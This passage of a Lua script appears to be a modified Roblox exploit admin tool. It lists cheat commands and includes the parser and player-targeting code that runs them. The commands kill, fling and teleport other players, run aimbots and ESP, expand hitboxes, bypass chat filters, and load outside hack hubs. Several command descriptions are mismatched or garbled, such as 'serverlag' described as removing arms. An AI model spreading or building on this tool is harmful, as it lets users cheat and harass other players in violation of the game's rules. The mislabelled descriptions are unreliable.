CMDs[#CMDs + 1] = {NAME = 'tweengotopart / tgotopart [part name]', DESC = 'Tweens your character to a part or multiple parts'}
CMDs[#CMDs + 1] = {NAME = 'gotopartclass / gpc [class name]', DESC = 'Moves your character to a part or multiple parts based on classname'}
CMDs[#CMDs + 1] = {NAME = 'tweengotopartclass / tgpc [class name]', DESC = 'Tweens your character to a part or multiple parts based on classname'}
CMDs[#CMDs + 1] = {NAME = 'gotomodel [part name]', DESC = 'Moves your character to a model or multiple models'}
CMDs[#CMDs + 1] = {NAME = 'tweengotomodel / tgotomodel [part name]', DESC = 'Tweens your character to a model or multiple models'}
CMDs[#CMDs + 1] = {NAME = 'something', DESC = 'Adjusts how quickly you teleport to each part (default is 0.1)'}
CMDs[#CMDs + 1] = {NAME = 'bringpart [part name] (CLIENT)', DESC = 'Moves a part or multiple parts to your character'}
CMDs[#CMDs + 1] = {NAME = 'bringpartclass / bpc [class name] (CLIENT)', DESC = 'Moves a part or multiple parts to your character based on classname'}
CMDs[#CMDs + 1] = {NAME = 'noclickdetectorlimits / nocdlimits', DESC = 'Sets all click detectors MaxActivationDistance to math.huge'}
CMDs[#CMDs + 1] = {NAME = 'trail / front [plr]', DESC = 'Uses all click detectors in a game'}
CMDs[#CMDs + 1] = {NAME = 'firetouchinterests / touchinterests', DESC = 'Uses all touchinterests in a game'}
CMDs[#CMDs + 1] = {NAME = 'simulationradius / sr', DESC = 'Sets your SimulationRadius to math.huge'}
CMDs[#CMDs + 1] = {NAME = 'nosimulationradius / nsr', DESC = 'Turns off the SimulationRadius loop and restores values to default'}
CMDs[#CMDs + 1] = {NAME = 'blackhole / nagato / meteor / planetarydevastation / gravityball / allmightypull / planetarydeva [plr]', DESC = 'Teleports unanchored parts to a player'}
CMDs[#CMDs + 1] = {NAME = 'freezeunanchored / freezeua', DESC = 'Freezes unanchored parts'}
CMDs[#CMDs + 1] = {NAME = 'thawunanchored / thawua / unfreezeua', DESC = 'Thaws unanchored parts'}
CMDs[#CMDs + 1] = {NAME = 'removeterrain / rterrain / noterrain', DESC = 'Removes all terrain'}
CMDs[#CMDs + 1] = {NAME = 'clearnilinstances / nonilinstances / cni', DESC = 'Removes nil instances'}
CMDs[#CMDs + 1] = {NAME = 'tpunanchored / tpua [plr]', DESC = 'Sets FallenPartsDestroyHeight'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'fullbright / fb (CLIENT)', DESC = 'Makes the map brighter / more visible'}
CMDs[#CMDs + 1] = {NAME = 'ambient [num] [num] [num] (CLIENT)', DESC = 'Changes ambient'}
CMDs[#CMDs + 1] = {NAME = 'day (CLIENT)', DESC = 'Changes the time to day for the client'}
CMDs[#CMDs + 1] = {NAME = 'night (CLIENT)', DESC = 'Changes the time to night for the client'}
CMDs[#CMDs + 1] = {NAME = 'nofog (CLIENT)', DESC = 'Removes fog'}
CMDs[#CMDs + 1] = {NAME = 'brightness [num] (CLIENT)', DESC = 'Changes the brightness lighting property'}
CMDs[#CMDs + 1] = {NAME = 'globalshadows / gshadows (CLIENT)', DESC = 'Enables global shadows'}
CMDs[#CMDs + 1] = {NAME = 'noglobalshadows / nogshadows (CLIENT)', DESC = 'Disables global shadows'}
CMDs[#CMDs + 1] = {NAME = 'restorelighting / rlighting', DESC = 'Restores Lighting properties'}
CMDs[#CMDs + 1] = {NAME = 'light [radius] [brightness] (CLIENT)', DESC = 'Gives your player dynamic light'}
CMDs[#CMDs + 1] = {NAME = 'nolight / unlight', DESC = 'Removes dynamic light from your player'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'age [plr]', DESC = 'Tells you the age of a player'}
CMDs[#CMDs + 1] = {NAME = 'chatage [plr]', DESC = 'Chats the age of a player'}
CMDs[#CMDs + 1] = {NAME = 'darkhub / dh [plr]', DESC = 'Loads dark hub'}
CMDs[#CMDs + 1] = {NAME = 'chatjoindate / cjd [plr]', DESC = 'Chats the date the player joined Roblox'}
CMDs[#CMDs + 1] = {NAME = 'copyname / copyuser [plr]', DESC = 'Copies a players full username to your clipboard'}
CMDs[#CMDs + 1] = {NAME = 'userid / id [plr]', DESC = 'Notifies a players user ID'}
CMDs[#CMDs + 1] = {NAME = 'copyuserid / copyid [plr]', DESC = 'Copies a players user ID to your clipboard'}
CMDs[#CMDs + 1] = {NAME = 'appearanceid / aid [plr]', DESC = 'Notifies a players appearance ID'}
CMDs[#CMDs + 1] = {NAME = 'copyappearanceid / caid [plr]', DESC = 'Copies a players appearance ID to your clipboard'}
CMDs[#CMDs + 1] = {NAME = 'bang [plr] [speed]', DESC = 'owo'}
CMDs[#CMDs + 1] = {NAME = 'unbang', DESC = 'uwu'}
CMDs[#CMDs + 1] = {NAME = 'carpet [plr]', DESC = 'Be someones carpet'}
CMDs[#CMDs + 1] = {NAME = 'uncarpet', DESC = 'Undoes carpet'}
CMDs[#CMDs + 1] = {NAME = 'friend [plr]', DESC = 'Sends a friend request to certain players'}
CMDs[#CMDs + 1] = {NAME = 'unfriend [plr]', DESC = 'Unfriends certain players'}
CMDs[#CMDs + 1] = {NAME = 'headsit [plr]', DESC = 'Sit on a players head'}
CMDs[#CMDs + 1] = {NAME = 'walkonwalls / wow', DESC = 'Walk on walls'}
CMDs[#CMDs + 1] = {NAME = 'bruhhub / bh', DESC = 'Loads Bruh Hub'}
CMDs[#CMDs + 1] = {NAME = 'unwalkto / unfollow', DESC = 'Stops following a player'}
CMDs[#CMDs + 1] = {NAME = 'stareat / stare [plr]', DESC = 'Stare / look at a player'}
CMDs[#CMDs + 1] = {NAME = 'unstareat / unstare [plr]', DESC = 'Disables stareat'}
CMDs[#CMDs + 1] = {NAME = 'attach [plr] (TOOL)', DESC = 'Attaches you to a player (YOU NEED A TOOL)'}
CMDs[#CMDs + 1] = {NAME = 'hammer [plr] (TOOL)', DESC = 'Gives prison lfie hammer'}
CMDs[#CMDs + 1] = {NAME = 'fastkill [plr] (TOOL)', DESC = 'Kills a player (less reliable) (YOU NEED A TOOL)'}
CMDs[#CMDs + 1] = {NAME = 'handlekill / hkill [plr] (TOOL)', DESC = 'Kills a player using tool damage (YOU NEED A TOOL)'}
CMDs[#CMDs + 1] = {NAME = 'doo [plr] (TOOL)', DESC = 'Brings a player (YOU NEED A TOOL)'}
CMDs[#CMDs + 1] = {NAME = 'gt / bring [plr] (TOOL)', DESC = 'Brings a player (less reliable) (YOU NEED A TOOL)'}
CMDs[#CMDs + 1] = {NAME = 'teleport / tp [plr] [plr] (TOOL)', DESC = 'Teleports a player to another player (YOU NEED A TOOL)'}
CMDs[#CMDs + 1] = {NAME = 'fastteleport / fasttp [plr] [plr] (TOOL)', DESC = 'Teleports a player to another player (less reliable) (YOU NEED A TOOL)'}
CMDs[#CMDs + 1] = {NAME = 'fling', DESC = 'Flings anyone you touch'}
CMDs[#CMDs + 1] = {NAME = 'unfling', DESC = 'Disables the fling command'}
CMDs[#CMDs + 1] = {NAME = 'invisfling', DESC = 'Enables invisible fling'}
CMDs[#CMDs + 1] = {NAME = 'fighter / boxer', DESC = 'Loads FE Fighter script'}
CMDs[#CMDs + 1] = {NAME = 'unamedesp / ue', DESC = 'Loads Sushi Hub'}
CMDs[#CMDs + 1] = {NAME = 'muteboombox [plr]', DESC = 'Mutes someones boombox'}
CMDs[#CMDs + 1] = {NAME = 'unmuteboombox [plr]', DESC = 'Unmutes someones boombox'}
CMDs[#CMDs + 1] = {NAME = 'serveradmin / sa', DESC = 'Loads FE Server Admin'}
CMDs[#CMDs + 1] = {NAME = 'hitbox [plr] [size]', DESC = 'Expands the hitbox for players heads (default is 1)'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'reset', DESC = 'Resets your character normally'}
CMDs[#CMDs + 1] = {NAME = 'respawn', DESC = 'Respawns you'}
CMDs[#CMDs + 1] = {NAME = 'refresh / r', DESC = 'Respawns and brings you back to the same position'}
CMDs[#CMDs + 1] = {NAME = 'flip', DESC = 'Loads a flip script Z, X, C'}
CMDs[#CMDs + 1] = {NAME = 'invisible / invis', DESC = 'Makes you invisible to other players'}
CMDs[#CMDs + 1] = {NAME = 'visible / vis', DESC = 'Makes you visible to other players'}
CMDs[#CMDs + 1] = {NAME = 'toolinvisible / toolinvis / tinvis', DESC = 'Makes you invisible to other players and able to use tools'}
CMDs[#CMDs + 1] = {NAME = 'speed / ws [num]', DESC = 'Change your walkspeed'}
CMDs[#CMDs + 1] = {NAME = 'loopspeed / loopws [num]', DESC = 'Loops your walkspeed'}
CMDs[#CMDs + 1] = {NAME = 'unloopspeed / unloopws', DESC = 'Turns off loopspeed'}
CMDs[#CMDs + 1] = {NAME = 'Bizzare / ba', DESC = 'Loads Bizzare Adventures Gui By Damascus'}
CMDs[#CMDs + 1] = {NAME = 'jumppower / jpower / jp [num]', DESC = 'Change a players jump height'}
CMDs[#CMDs + 1] = {NAME = 'loopjumppower / loopjp [num]', DESC = 'Loops your jump height'}
CMDs[#CMDs + 1] = {NAME = 'unloopjumppower / unloopjp [num]', DESC = 'Turns off loopjumppower'}
CMDs[#CMDs + 1] = {NAME = 'maxslopeangle / msa [num]', DESC = 'Adjusts MaxSlopeAngle'}
CMDs[#CMDs + 1] = {NAME = 'gravity / grav [num] (CLIENT)', DESC = 'Change your gravity'}
CMDs[#CMDs + 1] = {NAME = 'sit', DESC = 'Makes your character sit'}
CMDs[#CMDs + 1] = {NAME = 'sitwalk', DESC = 'Makes your character sit while still being able to walk'}
CMDs[#CMDs + 1] = {NAME = 'nosit', DESC = 'Prevents your character from sitting'}
CMDs[#CMDs + 1] = {NAME = 'unnosit', DESC = 'Disables nosit'}
CMDs[#CMDs + 1] = {NAME = 'jump', DESC = 'Makes your character jump'}
CMDs[#CMDs + 1] = {NAME = 'infinitejump / infjump', DESC = 'Allows you to jump before hitting the ground'}
CMDs[#CMDs + 1] = {NAME = 'uninfinitejump / uninfjump', DESC = 'Disables infjump'}
CMDs[#CMDs + 1] = {NAME = 'flyjump', DESC = 'Allows you to hold space to fly up'}
CMDs[#CMDs + 1] = {NAME = 'unflyjump', DESC = 'Disables flyjump'}
CMDs[#CMDs + 1] = {NAME = 'autojump / ajump', DESC = 'Automatically jumps when you run into an object'}
CMDs[#CMDs + 1] = {NAME = 'unautojump / unajump', DESC = 'Disables autojump'}
CMDs[#CMDs + 1] = {NAME = 'edgejump / ejump', DESC = 'Automatically jumps when you get to the edge of an object'}
CMDs[#CMDs + 1] = {NAME = 'unedgejump / unejump', DESC = 'Disables edgejump'}
CMDs[#CMDs + 1] = {NAME = 'sushihub/ sh', DESC = 'Loads Sushi Hub'}
CMDs[#CMDs + 1] = {NAME = 'aimbot2 / ae2', DESC = 'Aimbot at head'}
CMDs[#CMDs + 1] = {NAME = 'aimbot / ae', DESC = 'Loads an aimbot and esp gui'}
CMDs[#CMDs + 1] = {NAME = 'chatbypass / cb', DESC = 'Loads a chatbypass gui'}
CMDs[#CMDs + 1] = {NAME = 'enablestate [StateType]', DESC = 'Enables a humanoid state type'}
CMDs[#CMDs + 1] = {NAME = 'disablestate [StateType]', DESC = 'Disables a humanoid state type'}
CMDs[#CMDs + 1] = {NAME = 'team [team name] (CLIENT)', DESC = 'Changes your team. Sometimes fools localscripts.'}
CMDs[#CMDs + 1] = {NAME = 'nobillboardgui / nobgui / noname', DESC = 'Removes billboard and surface guis from your players (i.e. name guis at cafes)'}
CMDs[#CMDs + 1] = {NAME = 'loopnobgui / loopnoname', DESC = 'Loop removes billboard and surface guis from your players (i.e. name guis at cafes)'}
CMDs[#CMDs + 1] = {NAME = 'unloopnobgui / unloopnoname', DESC = 'Disables loopnobgui'}
CMDs[#CMDs + 1] = {NAME = 'nohead / headless', DESC = 'Removes your head (uses simulation radius)'}
CMDs[#CMDs + 1] = {NAME = 'serverlag', DESC = 'Removes your arms'}
CMDs[#CMDs + 1] = {NAME = 'valianthub', DESC = 'Removes your legs'}
CMDs[#CMDs + 1] = {NAME = 'nolimbs', DESC = 'Removes your limbs'}
CMDs[#CMDs + 1] = {NAME = 'naked', DESC = 'Removes your clothing'}
CMDs[#CMDs + 1] = {NAME = 'noface / removeface', DESC = 'Removes your face'}
CMDs[#CMDs + 1] = {NAME = 'blockhead', DESC = 'Turns your head into a block'}
CMDs[#CMDs + 1] = {NAME = 'blockhats', DESC = 'Turns your hats into blocks'}
CMDs[#CMDs + 1] = {NAME = 'blocktool', DESC = 'Turns the currently selected tool into a block'}
CMDs[#CMDs + 1] = {NAME = 'creeper', DESC = 'Makes you look like a creeper'}
CMDs[#CMDs + 1] = {NAME = 'drophats', DESC = 'Drops your hats'}
CMDs[#CMDs + 1] = {NAME = 'nohats / deletehats / rhats', DESC = 'Deletes your hats'}
CMDs[#CMDs + 1] = {NAME = 'hatspin / spinhats', DESC = 'Spins your characters accessories'}
CMDs[#CMDs + 1] = {NAME = 'unhatspin / unspinhats', DESC = 'Undoes spinhats'}
CMDs[#CMDs + 1] = {NAME = 'clearhats / cleanhats', DESC = 'Clears hats in the workspace'}
CMDs[#CMDs + 1] = {NAME = 'chardelete / cd [instance name]', DESC = 'Removes any part with a certain name from your character'}
CMDs[#CMDs + 1] = {NAME = 'chardeleteclass / cdc [class name]', DESC = 'Removes any part with a certain classname from your character'}
CMDs[#CMDs + 1] = {NAME = 'deletevelocity / dv / removeforces', DESC = 'Removes any velocity / force instances in your character'}
CMDs[#CMDs + 1] = {NAME = 'm9', DESC = 'give prison life m9'}
CMDs[#CMDs + 1] = {NAME = 'unweaken', DESC = 'Sets your characters CustomPhysicalProperties to default'}
CMDs[#CMDs + 1] = {NAME = 'strengthen [num]', DESC = 'Makes your character more dense (CustomPhysicalProperties)'}
CMDs[#CMDs + 1] = {NAME = 'unstrengthen', DESC = 'Sets your characters CustomPhysicalProperties to default'}
CMDs[#CMDs + 1] = {NAME = 'breakvelocity', DESC = 'Sets your characters velocity to 0'}
CMDs[#CMDs + 1] = {NAME = 'spin [speed]', DESC = 'Spins your character'}
CMDs[#CMDs + 1] = {NAME = 'unspin', DESC = 'Disables spin'}
CMDs[#CMDs + 1] = {NAME = 'vr', DESC = 'Loads CLOVR by Abacaxl'}
CMDs[#CMDs + 1] = {NAME = 'split', DESC = 'Splits your character in half'}
CMDs[#CMDs + 1] = {NAME = 'nilchar', DESC = 'Sets your characters parent to nil'}
CMDs[#CMDs + 1] = {NAME = 'unnilchar / nonilchar', DESC = 'Sets your characters parent to workspace'}
CMDs[#CMDs + 1] = {NAME = 'knife', DESC = 'gives prison lfie knife'}
CMDs[#CMDs + 1] = {NAME = 'replaceroot', DESC = 'Replaces your characters HumanoidRootPart'}
CMDs[#CMDs + 1] = {NAME = 'clearcharappearance / clearchar / clrchar', DESC = 'Removes all accessory, shirt, pants, charactermesh, and bodycolors'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'animation / anim [ID] [speed]', DESC = 'Makes your character perform an animation (must be by roblox to replicate)'}
CMDs[#CMDs + 1] = {NAME = 'dance', DESC = 'Makes you  d a n c e'}
CMDs[#CMDs + 1] = {NAME = 'reanimationhub / rh', DESC = 'Stops dance animations'}
CMDs[#CMDs + 1] = {NAME = 'spasm', DESC = 'Makes you  c r a z y'}
CMDs[#CMDs + 1] = {NAME = 'unspasm', DESC = 'Stops spasm'}
CMDs[#CMDs + 1] = {NAME = 'headthrow', DESC = 'Simply makes you throw your head'}
CMDs[#CMDs + 1] = {NAME = 'noanim', DESC = 'Disables your animations'}
CMDs[#CMDs + 1] = {NAME = 'reanim', DESC = 'Restores your animations'}
CMDs[#CMDs + 1] = {NAME = 'animspeed [num]', DESC = 'Changes the speed of your current animation'}
CMDs[#CMDs + 1] = {NAME = 'loopanimation / loopanim', DESC = 'Loops your current animation'}
CMDs[#CMDs + 1] = {NAME = 'stopanimations / stopanims', DESC = 'Stops running animations'}
CMDs[#CMDs + 1] = {NAME = 'refreshanimations / refreshanims / rean', DESC = 'Refreshes animations'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'autoclick [click delay] [release delay]', DESC = 'Automatically clicks your mouse with a set delay'}
CMDs[#CMDs + 1] = {NAME = 'unautoclick / noautoclick', DESC = 'Turns off autoclick'}
CMDs[#CMDs + 1] = {NAME = 'autokeypress [key] [down delay] [up delay]', DESC = 'Automatically presses a key with a set delay'}
CMDs[#CMDs + 1] = {NAME = 'unautokeypress', DESC = 'Stops autokeypress'}
CMDs[#CMDs + 1] = {NAME = 'hovername', DESC = 'Shows a players username when your mouse is hovered over them'}
CMDs[#CMDs + 1] = {NAME = 'unhovername / nohovername', DESC = 'Turns off hovername'}
CMDs[#CMDs + 1] = {NAME = 'mousesensitivity / ms [0-10]', DESC = 'Sets your mouse sensitivity (affects first person and right click drag) (default is 1)'}
CMDs[#CMDs + 1] = {NAME = 'clickdelete', DESC = 'Go to settings>Keybinds>Add for clicktp'}
CMDs[#CMDs + 1] = {NAME = 'clickteleport', DESC = 'Go to settings>Keybinds>Add for click tp'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'tools', DESC = 'Copies tools from ReplicatedStorage and Lighting'}
CMDs[#CMDs + 1] = {NAME = 'notools / removetools / deletetools', DESC = 'Removes tools from character and backpack'}
CMDs[#CMDs + 1] = {NAME = 'heal', DESC = 'Removes any currently selected tools'}
CMDs[#CMDs + 1] = {NAME = 'gtools / grabtools', DESC = 'Automatically get tools that are dropped'}
CMDs[#CMDs + 1] = {NAME = 'rf / reaper fling', DESC = 'Reaper Fling'}
CMDs[#CMDs + 1] = {NAME = 'copytools [plr] (CLIENT)', DESC = 'Copies a players tools'}
CMDs[#CMDs + 1] = {NAME = 'droptools', DESC = 'Drops your tools'}
CMDs[#CMDs + 1] = {NAME = 'droppabletools', DESC = 'Makes your tools droppable'}
CMDs[#CMDs + 1] = {NAME = 'equiptools', DESC = 'Equips every tool in your inventory at once'}
CMDs[#CMDs + 1] = {NAME = 'reach [num]', DESC = 'Increases the hitbox of your held tool'}
CMDs[#CMDs + 1] = {NAME = 'unreach / noreach', DESC = 'Turns off reach'}
CMDs[#CMDs + 1] = {NAME = 'grippos [X Y Z]', DESC = 'Changes your current tools grip position'}
CMDs[#CMDs + 1] = {NAME = 'usetools', DESC = 'Activates all tools in your backpack at the same time'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'addalias [cmd] [alias]', DESC = 'Adds an alias to a command'}
CMDs[#CMDs + 1] = {NAME = 'removealias [alias]', DESC = 'Removes a custom alias'}
CMDs[#CMDs + 1] = {NAME = 'clraliases', DESC = 'Removes all custom aliases'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'addplugin / plugin [name]', DESC = 'Add a plugin via command'}
CMDs[#CMDs + 1] = {NAME = 'removeplugin / deleteplugin [name]', DESC = 'Remove a plugin via command'}
CMDs[#CMDs + 1] = {NAME = 'reloadplugin [name]', DESC = 'Reloads a plugin'}
CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
CMDs[#CMDs + 1] = {NAME = 'timestop / ts', DESC = 'Stops Time'}
CMDs[#CMDs + 1] = {NAME = 'removecmd / deletecmd', DESC = 'Removes a command until the admin is reloaded'}
wait()

for i = 1, #CMDs do
	local newcmd = Example:Clone()
	newcmd.Parent = CMDsF
	newcmd.Visible = false
	newcmd.Text = CMDs[i].NAME
	newcmd.Name = 'CMD'
	table.insert(text1,newcmd)
	if CMDs[i].DESC ~= '' then
		local title = Instance.new("StringValue")
		title.Name = "Title"
		title.Parent = newcmd
		title.Value = CMDs[i].NAME
		local desc = Instance.new("StringValue")
		desc.Name = "Desc"
		desc.Parent = newcmd
		desc.Value = CMDs[i].DESC
		newcmd.MouseButton1Down:Connect(function()
			if newcmd.Visible and newcmd.TextTransparency == 0 then
				local currentText = Cmdbar.Text
				Cmdbar:CaptureFocus()
				autoComplete(newcmd.Text,currentText)
				maximizeHolder()
			end
		end)
	end
end

IndexContents('',true)

function getText(object)
	if object ~= nil then
		if object:FindFirstChild('Desc') ~= nil then
			return {object.Desc.Value, object:FindFirstChild('Title')}
		elseif object.Parent:FindFirstChild('Desc') ~= nil then
			return {object.Parent.Desc.Value, object.Parent:FindFirstChild('Title')}
		end
	end
	return nil
end

function checkTT()
	local t
	local guisAtPosition = COREGUI:GetGuiObjectsAtPosition(IYMouse.X, IYMouse.Y)

	for _, gui in pairs(guisAtPosition) do
		if gui.Parent == CMDsF then
			t = gui
		end
	end

	if t ~= nil then
		local gt = getText(t)
		if gt ~= nil then
			local x = IYMouse.X
			local y = IYMouse.Y
			local xP
			local yP
			if IYMouse.X > 200 then
				xP = x - 201
			else
				xP = x + 21
			end
			if IYMouse.Y > (IYMouse.ViewSizeY-96) then
				yP = y - 97
			else
				yP = y
			end
			Tooltip.Position = UDim2.new(0, xP, 0, yP)
			Description.Text = gt[1]
			if gt[2] ~= nil then
				Title_3.Text = gt[2].Value
			else
				Title_3.Text = ''
			end
			Tooltip.Visible = true
		else
			Tooltip.Visible = false
		end
	else
		Tooltip.Visible = false
	end
end

function FindInTable(tbl,val)
	if tbl == nil then return false end
	for _,v in pairs(tbl) do
		if v == val then return true end
	end 
	return false
end

function GetInTable(Table, Name)
	for i = 1, #Table do
		if Table[i] == Name then
			return i
		end
	end
	return false
end

function respawn(plr)
	if invisRunning then TurnVisible() end
	local char = plr.Character
	if char:FindFirstChildOfClass("Humanoid") then char:FindFirstChildOfClass("Humanoid"):ChangeState(15) end
	char:ClearAllChildren()
	local newChar = Instance.new("Model")
	newChar.Parent = workspace
	plr.Character = newChar
	wait()
	plr.Character = char
	newChar:Destroy()
end

local refreshCmd = false
function refresh(plr)
	refreshCmd = true
	local Human = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid", true)
	local pos = Human and Human.RootPart and Human.RootPart.CFrame
	local pos1 = workspace.CurrentCamera.CFrame
	respawn(plr)
	spawn(function()
		plr.CharacterAdded:Wait():WaitForChild("Humanoid").RootPart.CFrame, workspace.CurrentCamera.CFrame = pos, wait() and pos1
		refreshCmd = false
	end)
end

local lastDeath

function onDied()
	spawn(function()
		if pcall(function() Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') end) and Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
			Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Died:Connect(function()
				if getRoot(Players.LocalPlayer.Character) then
					lastDeath = getRoot(Players.LocalPlayer.Character).CFrame
				end
			end)
		else
			wait(2)
			onDied()
		end
	end)
end

Clip = true
spDelay = 0.1
Players.LocalPlayer.CharacterAdded:Connect(function()
	NOFLY()
	Floating = false

	if not Clip then
		execCmd('clip nonotify')
	end

	repeat wait() until getRoot(Players.LocalPlayer.Character)

	pcall(function()
		if spawnpoint and not refreshCmd and spawnpos ~= nil then
			wait(spDelay)
			getRoot(Players.LocalPlayer.Character).CFrame = spawnpos
		end
	end)

	onDied()
end)

onDied()

function getstring(begin)
	local start = begin-1
	local AA = '' for i,v in pairs(cargs) do
		if i > start then
			if AA ~= '' then
				AA = AA .. ' ' .. v
			else
				AA = AA .. v
			end
		end
	end
	return AA
end

findCmd=function(cmd_name)
	for i,v in pairs(cmds)do
		if v.NAME:lower()==cmd_name:lower() or FindInTable(v.ALIAS,cmd_name:lower()) then
			return v
		end
	end
	return customAlias[cmd_name:lower()]
end

function splitString(str,delim)
	local broken = {}
	if delim == nil then delim = "," end
	for w in string.gmatch(str,"[^"..delim.."]+") do
		table.insert(broken,w)
	end
	return broken
end

cmdHistory = {}
local lastCmds = {}
local historyCount = 0
local split=" "
local lastBreakTime = 0
function execCmd(cmdStr,speaker,store)
	cmdStr = cmdStr:gsub("%s+$","")
	spawn(function()
		local rawCmdStr = cmdStr
		cmdStr = string.gsub(cmdStr,"\\\\","%%BackSlash%%")
		local commandsToRun = splitString(cmdStr,"\\")
		for i,v in pairs(commandsToRun) do
			v = string.gsub(v,"%%BackSlash%%","\\")
			local x,y,num = v:find("^(%d+)%^")
			local cmdDelay = 0
			local infTimes = false
			if num then
				v = v:sub(y+1)
				local x,y,del = v:find("^([%d%.]+)%^")
				if del then
					v = v:sub(y+1)
					cmdDelay = tonumber(del) or 0
				end
			else
				local x,y = v:find("^inf%^")
				if x then
					infTimes = true
					v = v:sub(y+1)
					local x,y,del = v:find("^([%d%.]+)%^")
					if del then
						v = v:sub(y+1)
						del = tonumber(del) or 1
						cmdDelay = (del > 0 and del or 1)
					else
						cmdDelay = 1
					end
				end
			end
			num = tonumber(num or 1)

			if v:sub(1,1) == "!" then
				local chunks = splitString(v:sub(2),split)
				if chunks[1] and lastCmds[chunks[1]] then v = lastCmds[chunks[1]] end
			end

			local args = splitString(v,split)
			local cmdName = args[1]
			local cmd = findCmd(cmdName)
			if cmd then
				table.remove(args,1)
				cargs = args
				if not speaker then speaker = Players.LocalPlayer end
				if store then
					if speaker == Players.LocalPlayer then
						if cmdHistory[1] ~= rawCmdStr then table.insert(cmdHistory,1,rawCmdStr) end
					end
					if #cmdHistory > 30 then table.remove(cmdHistory) end

					lastCmds[cmdName] = v
				end
				local cmdStartTime = tick()
				if infTimes then
					while lastBreakTime < cmdStartTime do
						local success,err = pcall(cmd.FUNC,args, speaker)
						if not success and _G.IY_DEBUG then
							warn("Command Error:", cmdName, err)
						end
						wait(cmdDelay)
					end
				else
					for rep = 1,num do
						if lastBreakTime > cmdStartTime then break end
						local success,err = pcall(function()
							cmd.FUNC(args, speaker)
						end)
						if not success and _G.IY_DEBUG then
							warn("Command Error:", cmdName, err)
						end
						if cmdDelay ~= 0 then wait(cmdDelay) end
					end
				end
			end
		end
	end)
end	

function addcmd(name,alias,func,plgn)
	cmds[#cmds+1]=
		{
			NAME=name;
			ALIAS=alias or {};
			FUNC=func;
			PLUGIN=plgn;
		}
end

function removecmd(cmd)
	if cmd ~= " " then
		for i = #cmds,1,-1 do
			if cmds[i].NAME == cmd or FindInTable(cmds[i].ALIAS,cmd) then
				table.remove(cmds, i)
				for a,c in pairs(CMDsF:GetChildren()) do
					if string.find(c.Text, "^"..cmd.."$") or string.find(c.Text, "^"..cmd.." ") or string.find(c.Text, " "..cmd.."$") or string.find(c.Text, " "..cmd.." ") then
						c.TextTransparency = 0.7
						c.MouseButton1Click:Connect(function()
							notify(c.Text, "Command has been disabled by you or a plugin")
						end)
					end
				end
			end
		end
	end
end

function addbind(cmd,key,iskeyup)
	binds[#binds+1]=
		{
			COMMAND=cmd;
			KEY=key;
			ISKEYUP=iskeyup;
		}
end

function addcmdtext(text,name,desc)
	local newcmd = Example:Clone()
	local tooltipText = tostring(text)
	local tooltipDesc = tostring(desc)
	newcmd.Parent = CMDsF
	newcmd.Visible = false
	newcmd.Text = text
	newcmd.Name = 'PLUGIN_'..name
	table.insert(text1,newcmd)
	if desc and desc ~= '' then
		local title = Instance.new("StringValue")
		title.Name = "Title"
		title.Parent = newcmd
		title.Value = tooltipText
		local desc = Instance.new("StringValue")
		desc.Name = "Desc"
		desc.Parent = newcmd
		desc.Value = tooltipDesc
		newcmd.MouseButton1Down:Connect(function()
			if newcmd.Visible and newcmd.TextTransparency == 0 then
				Cmdbar:CaptureFocus()
				autoComplete(newcmd.Text)
				maximizeHolder()
			end
		end)
	end
end

SpecialPlayerCases = {
	["all"] = function(speaker)return Players:GetPlayers() end,
	["others"] = function(speaker)
		local plrs = {}
		for i,v in pairs(Players:GetPlayers()) do
			if v ~= speaker then
				table.insert(plrs,v)
			end
		end
		return plrs
	end,
	["me"] = function(speaker)return {speaker} end,
	["#(%d+)"] = function(speaker,args,currentList)
		local returns = {}
		local randAmount = tonumber(args[1])
		local players = {unpack(currentList)}
		for i = 1,randAmount do
			if #players == 0 then break end
			local randIndex = math.random(1,#players)
			table.insert(returns,players[randIndex])
			table.remove(players,randIndex)
		end
		return returns
	end,
	["random"] = function(speaker,args,currentList)
		local players = currentList
		return {players[math.random(1,#players)]}
	end,
	["%%(.+)"] = function(speaker,args)
		local returns = {}
		local team = args[1]
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Team and string.sub(string.lower(plr.Team.Name),1,#team) == string.lower(team) then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["allies"] = function(speaker)
		local returns = {}
		local team = speaker.Team
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Team == team then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["enemies"] = function(speaker)
		local returns = {}
		local team = speaker.Team
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Team ~= team then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["team"] = function(speaker)
		local returns = {}
		local team = speaker.Team
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Team == team then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["nonteam"] = function(speaker)
		local returns = {}
		local team = speaker.Team
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Team ~= team then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["friends"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(Players:GetPlayers()) do
			if plr:IsFriendsWith(speaker.UserId) and plr ~= speaker then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["nonfriends"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(Players:GetPlayers()) do
			if not plr:IsFriendsWith(speaker.UserId) and plr ~= speaker then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["guests"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Guest then
				table.insert(returns,plr)
